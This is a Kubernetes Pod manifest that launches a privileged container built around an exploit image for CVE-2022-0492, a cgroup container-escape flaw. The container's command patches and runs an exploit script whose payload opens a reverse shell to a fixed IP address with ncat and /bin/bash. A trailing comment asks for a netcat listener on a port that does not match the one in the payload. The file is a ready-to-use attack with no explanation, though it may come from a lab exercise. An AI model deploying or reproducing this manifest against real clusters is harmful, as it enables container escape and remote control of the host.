apiVersion: v1
kind: Pod
metadata:
  name: cgroup-exp-nc
spec:
  containers:
  - name: cgroup-exp-nc
    image: yaoyinnan/cve-2022-0492:latest
    securityContext:
      privileged: true
    command: ["/bin/sh"]
    args: ["-c", "sed -i \"s|/etc/mtab|/proc/self/mounts|g\" exp.sh; chmod +x exp.sh && ./exp.sh 'setsid ncat -nv 10.113.107.127 5555 -e /bin/bash > /dev/null 2>&1 &'; sleep infinity"]

    #before running this, make sure to run the following command on the host:
    #nc -lvp 4444
